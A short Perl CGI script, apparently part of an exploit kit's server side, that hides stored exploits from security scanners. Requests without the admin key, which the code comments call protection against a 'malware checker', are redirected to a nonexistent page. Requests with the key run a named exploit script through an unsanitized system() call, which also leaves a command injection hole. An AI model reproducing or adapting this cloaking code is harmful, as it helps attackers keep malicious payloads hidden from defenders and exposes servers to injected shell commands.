#!/usr/bin/perl

#
# Redirect Malware Checker for exploits
#

use CGI;
use DBI;
require "config.pl";


$q = new CGI;

$keyz = $q->param('keyz'); 
$exploittocheck = $q->param('exploittocheck');

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";


#check if good keyz otherwize don,t show exploit (Protection against malware checker)
$keyzcheck = $dbh->selectrow_array("SELECT keyz FROM options WHERE username='Admin'");



if($keyzcheck eq '' or $keyzcheck ne $keyz)
{
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{
  #print $q->header();
  $checkme = system("cd exploits;perl $exploittocheck.pl");
  print "$checkme";
  #print "Status: 301 Moved\nLocation: $config{UrlToFolder}/exploits/$exploittocheck\.pl\n\n";
}


#Disconnect to database
$dbh->disconnect();

1;
